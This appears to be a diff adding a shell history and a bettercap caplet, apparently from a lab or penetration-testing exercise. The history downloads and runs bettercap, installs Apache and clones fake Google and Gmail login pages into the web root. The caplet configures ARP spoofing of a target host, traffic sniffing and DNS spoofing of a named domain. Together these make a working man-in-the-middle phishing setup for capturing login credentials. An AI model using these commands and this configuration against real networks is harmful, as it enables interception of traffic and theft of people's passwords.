@@ -1,0 +1,53 @@
+sudo apt-get install ca-certificates libnetfilter-queue-dev libpcap-dev unzip wget -y
+    2  wget http://192.168.1.251/sw/va_pt/Spoofing/bettercap_linux_amd64_v2.28.zip
+    3  ls -l
+    4  unzip bettercap_linux_amd64_v2.28.zip
+    5  ls -l
+    6  nano spoof.cap
+    7  sudo ./bettercap -iface ens33 -caplet spoof.cap
+   11  sudo ./bettercap -iface ens33 -caplet spoof.cap
+   12  y
+   13  nano spoof.cap
+   14  sudo ./bettercap -iface ens33 -caplet spoof.cap
+   15  nano spoof.cap
+   16  sudo ./bettercap -iface ens33 -caplet spoof.cap
+   17  nano spoof.cap
+   18  sudo apt install apache2
+   19  cd /var/www/html
+   20  ls
+   21  sudo rm index.html
+   22  sudo git clone https://github.com/YehudaEi/Google-Fake-Login-Page.git
+   23  sudo apt-get install git
+   24  sudo git clone https://github.com/YehudaEi/Google-Fake-Login-Page.git
+   25  ip a
+   26  sudo rm Google-Fake-Login-Page/
+   27  ls
+   28  sudo rm -r Google-Fake-Login-Page/
+   29  ls
+   30  clear
+   31  sudo git clone https://github.com/Vamsheeth/Gmail-Login.git
+   32  ls
+   33  cd
+   34  ls
+   35  sudo ./bettercap -iface ens33 -caplet spoof.cap
+   36  nano spoof.txt
+
+
+
+
+
+
+
+net.probe on
+set arp.spoof.Fullduplex true
+set arp.spoof.targets 192.168.80.146
+arp.spoof on
+set net.sniff.local true
+net.sniff on
+set dns.spoof.all true
+set dns.spoof.domains iacsd.com
+dns.spoof on
+
+
+
+
